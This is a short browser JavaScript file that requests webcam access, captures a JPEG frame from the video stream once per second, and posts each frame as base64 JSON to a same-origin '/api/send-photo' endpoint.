const video = document.getElementById('camera');

// Start camera
navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        video.srcObject = stream;

        // Capture every 1 sec
        setInterval(() => captureAndSend(), 1000);
    })
    .catch(err => console.error("Camera error:", err));

function captureAndSend() {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL('image/jpeg');
    sendPhotoToServer(imageData);
}

function sendPhotoToServer(imageData) {
    fetch('/api/send-photo', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image: imageData })
    }).catch(err => console.error("Send error:", err));
}
